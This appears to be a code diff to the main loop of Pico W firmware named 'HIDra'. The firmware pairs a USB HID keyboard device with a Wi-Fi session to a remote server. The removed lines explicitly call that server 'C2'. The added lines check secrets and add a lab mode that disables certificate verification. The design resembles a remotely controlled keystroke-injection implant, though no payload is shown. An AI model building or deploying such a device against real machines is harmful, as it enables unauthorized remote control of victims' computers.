-    /* Start Core 1 (TinyUSB HID) before touching Wi-Fi */
+    printf("[BOOT] HIDra protocol v2; physical operation unvalidated\n");
+#if AGENT_LAB_MODE
+    printf("[WARN] LAB MODE: server certificate verification disabled\n");
+#endif
+    if (!valid_secret(RUNNER_TOKEN) || !valid_secret(RUNNER_HMAC_SECRET) ||
+        !strcmp(RUNNER_TOKEN, RUNNER_HMAC_SECRET)) return 1;
+    critical_section_init(&ring_lock);
+    hid_queue_init(&queue, enter_queue, leave_queue, &ring_lock);
     multicore_launch_core1(core1_entry);
-    sleep_ms(500);
-
-    /* Initialise CYW43 Wi-Fi */
-    if (cyw43_arch_init()) {
-        printf("[WiFi] init failed\n");
-        return 1;
-    }
+    if (cyw43_arch_init()) return 1;
     cyw43_arch_enable_sta_mode();
-
-    printf("[WiFi] connecting to '%s'...\n", WIFI_SSID);
-    int wifi_ret = cyw43_arch_wifi_connect_timeout_ms(
-        WIFI_SSID, WIFI_PASS, CYW43_AUTH_WPA2_AES_PSK, 30000);
-    if (wifi_ret) {
-        printf("[WiFi] connect failed: %d\n", wifi_ret);
-        return 1;
-    }
-    printf("[WiFi] connected, IP: %s\n",
-           ip4addr_ntoa(netif_ip4_addr(netif_default)));
-
-    /* LED on = online */
-    cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 1);
-
-    /* Jittered exponential backoff reconnect loop */
-    uint32_t backoff_ms = 1000;
+    unsigned attempt = 0;
     for (;;) {
-        printf("[C2] connecting to %s:%d\n", C2_HOST, C2_PORT);
-        run_session();
-
-        /* Blink LED while disconnected */
-        cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 0);
-        printf("[C2] retry in %lu ms\n", (unsigned long)backoff_ms);
-        sleep_ms(backoff_ms);
-        cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 1);
-
-        /* Double backoff up to 60 s with ±20 % jitter */
-        backoff_ms = backoff_ms < 30000 ? backoff_ms * 2 : 60000;
-        uint32_t jitter = backoff_ms / 5;   /* 20 % */
-        backoff_ms += (get_rand_32() % (jitter * 2)) - jitter;
+        int status = cyw43_tcpip_link_status(&cyw43_state, CYW43_ITF_STA);
+        if (status != CYW43_LINK_UP && cyw43_arch_wifi_connect_timeout_ms(
+            WIFI_SSID, WIFI_PASS, CYW43_AUTH_WPA2_AES_PSK, 30000) != 0) {
+            printf("[WiFi] connection failed\n");
+        } else {
+            int outcome = run_session();
+            if (outcome) {
+                if (outcome == 2) watchdog_reboot(0, 0, 0);
+                cyw43_arch_deinit();
+                for (;;) sleep_ms(1000); /* USB keeps servicing release; explicit exit does not reconnect. */
+            }
+        }
+        unsigned base = attempt < 6 ? 1000u << attempt : 60000u;
+        if (base > 60000) base = 60000;
+        unsigned delay = base * 4 / 5 + get_rand_32() % (base * 2 / 5 + 1);
+        if (delay > 60000) delay = 60000;
+        if (delay < 1000) delay = 1000;
+        if (attempt < 6) ++attempt;
+        absolute_time_t until = make_timeout_time_ms(delay);
+        while (!time_reached(until)) hidra_network_poll();
     }
 }
